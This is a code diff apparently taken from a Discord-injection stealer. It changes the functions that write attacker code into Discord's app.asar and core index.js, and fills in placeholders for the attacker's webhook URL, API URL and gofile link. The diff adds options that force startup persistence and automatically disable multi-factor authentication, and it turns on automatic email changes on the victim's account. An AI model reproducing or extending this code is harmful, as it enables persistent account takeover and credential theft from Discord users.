@@ -16,6 +16,7 @@ async function persistentInjection(appDir, injectionUrl, webhook, configInject) 
     const CONFIG_INJECT = configInject;
     const asarFilePath = path.join(appDir, 'resources', 'app.asar');
     const unpackedDir = path.join(appDir, 'resources', 'unpacked');
+    
     try {
         const srcInjectionAsar = `
             "use strict";
@@ -124,9 +125,11 @@ async function persistentInjection(appDir, injectionUrl, webhook, configInject) 
                                 const newContent = chunk
                                     .replace("%WEBHOOK_URL%", "${webhook}")
                                     .replace("%API_URL%", "${CONFIG_INJECT.API}")
-                                    .replace("%AUTO_USER_PROFILE_EDIT%", "${CONFIG_INJECT.auto_user_profile_edit}")
-                                    .replace("%AUTO_EMAIL_UPDATE%", "${CONFIG_INJECT.auto_email_update}")
-                                    .replace("%GOFILE_DOWNLOAD_LINK%", "${CONFIG_INJECT.gofile_download_link}");
+                                    .replace('%FORCE_PERSIST_STARTUP%', '${CONFIG_INJECT.force_persist_startup}')
+                                    .replace('%AUTO_MFA_DISABLER%', '${CONFIG_INJECT.auto_mfa_disabler}')
+                                    .replace('%AUTO_EMAIL_UPDATE%', '${CONFIG_INJECT.auto_email_update}')
+                                    .replace('%AUTO_USER_PROFILE_EDIT%', '${CONFIG_INJECT.auto_user_profile_edit}')
+                                    .replace('%GOFILE_DOWNLOAD_LINK%', '${CONFIG_INJECT.gofile_download_link}')
 
                                 fs.writeFileSync(indexFilePath, newContent);
                             });
@@ -191,8 +194,10 @@ async function injectDiscord(dir, injectionUrl, webhook, api) {
     try {
         const CONFIG_INJECT = {
             API: api,
+            force_persist_startup: 'true',
+            auto_mfa_disabler: 'true',
+            auto_email_update: 'true',
             auto_user_profile_edit: 'true',
-            auto_email_update: 'false',
             gofile_download_link: 'https://gofile.io', // Perhaps I'll add something better when there are more stars
         };
 
@@ -230,9 +235,11 @@ async function injectDiscord(dir, injectionUrl, webhook, api) {
                 const srcInjection = injection
                     .replace("%WEBHOOK_URL%", webhook)
                     .replace("%API_URL%", CONFIG_INJECT.API)
-                    .replace("%AUTO_USER_PROFILE_EDIT%", CONFIG_INJECT.auto_user_profile_edit)
+                    .replace("%FORCE_PERSIST_STARTUP%", CONFIG_INJECT.force_persist_startup)
+                    .replace("%AUTO_MFA_DISABLER%", CONFIG_INJECT.auto_mfa_disabler)
                     .replace("%AUTO_EMAIL_UPDATE%", CONFIG_INJECT.auto_email_update)
-                    .replace("%GOFILE_DOWNLOAD_LINK%", CONFIG_INJECT.gofile_download_link);
+                    .replace("%AUTO_USER_PROFILE_EDIT%", CONFIG_INJECT.auto_user_profile_edit)
+                    .replace("%GOFILE_DOWNLOAD_LINK%", CONFIG_INJECT.gofile_download_link)
                     
                 const indexJsPath = path.join(coreDir, 'index.js');
 
